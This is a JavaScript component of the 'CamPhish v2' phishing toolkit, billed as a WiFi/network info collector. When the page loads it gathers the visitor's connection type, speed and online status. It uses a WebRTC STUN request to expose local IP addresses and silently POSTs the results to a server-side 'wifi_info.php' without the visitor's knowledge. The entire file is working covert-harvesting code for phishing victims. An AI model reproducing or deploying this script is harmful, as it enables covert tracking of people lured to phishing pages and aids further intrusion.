// CamPhish v2 — WiFi/Network Info Collector
// Collects network connection details from browser APIs

(function() {
    'use strict';

    var networkInfo = {};
    networkInfo.timestamp = new Date().toISOString();

    // Network Information API
    if (navigator.connection) {
        var conn = navigator.connection;
        networkInfo.effectiveType = conn.effectiveType || 'Unknown';  // 4g, 3g, 2g, slow-2g
        networkInfo.downlink = conn.downlink || 'Unknown';  // Mbps
        networkInfo.rtt = conn.rtt || 'Unknown';  // ms
        networkInfo.saveData = conn.saveData || false;
        networkInfo.type = conn.type || 'Unknown';  // wifi, cellular, ethernet, etc.
    }

    // Online status
    networkInfo.online = navigator.onLine;

    // WebRTC local IP detection (works on some browsers)
    function getLocalIPs() {
        return new Promise(function(resolve) {
            var ips = [];
            try {
                var rtc = new (window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection)({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                rtc.createDataChannel('');
                rtc.createOffer().then(function(offer) {
                    rtc.setLocalDescription(offer);
                });
                
                rtc.onicecandidate = function(event) {
                    if (event && event.candidate && event.candidate.candidate) {
                        var parts = event.candidate.candidate.split(' ');
                        var ip = parts[4];
                        if (ip && ips.indexOf(ip) === -1 && ip.indexOf('.') > -1) {
                            ips.push(ip);
                        }
                    }
                    if (!event.candidate) {
                        rtc.close();
                        resolve(ips);
                    }
                };
                
                // Timeout after 5 seconds
                setTimeout(function() {
                    rtc.close();
                    resolve(ips);
                }, 5000);
                
            } catch(e) {
                resolve([]);
            }
        });
    }

    // WiFi SSID is not available from browser APIs (security restriction)
    // But we can determine connection type
    function determineConnectionType() {
        if (navigator.connection) {
            var type = navigator.connection.type;
            if (type === 'wifi') return 'WiFi';
            if (type === 'cellular') return 'Mobile Data';
            if (type === 'ethernet') return 'Ethernet';
            if (type === 'bluetooth') return 'Bluetooth';
            if (type === 'none') return 'Offline';
            
            // Fallback: guess from effective type and rtt
            var etype = navigator.connection.effectiveType;
            var rtt = navigator.connection.rtt;
            if (etype === '4g' && rtt < 50) return 'Likely WiFi';
            if (etype === '4g') return 'WiFi or 4G';
            if (etype === '3g') return 'Likely 3G Mobile';
            if (etype === '2g') return 'Likely 2G Mobile';
        }
        return 'Unknown';
    }

    networkInfo.connectionType = determineConnectionType();

    // Collect and send
    getLocalIPs().then(function(ips) {
        networkInfo.localIPs = ips;
        
        // Send to server
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'wifi_info.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('wifi=' + encodeURIComponent(JSON.stringify(networkInfo)));
    });
})();
